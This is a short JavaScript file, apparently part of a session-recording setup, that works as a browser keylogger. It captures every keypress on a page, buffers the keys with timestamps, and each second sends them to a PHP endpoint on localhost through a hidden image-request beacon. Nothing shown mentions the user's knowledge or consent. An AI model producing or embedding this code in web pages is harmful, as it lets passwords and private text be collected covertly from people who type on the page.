// Recording keystrokes 
console.log("started logging.");
var buffer = [];
var server = 'http://localhost/Php/keystrokeServer.php?c='
onkeypress = function(e) {
    var timestamp = 0; //parent.getSessionTime() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = server + data;
        buffer = [];
        console.log('data sent yay');
    }
}, 1000);
//parent.document.getElementById("iframe").height = 400;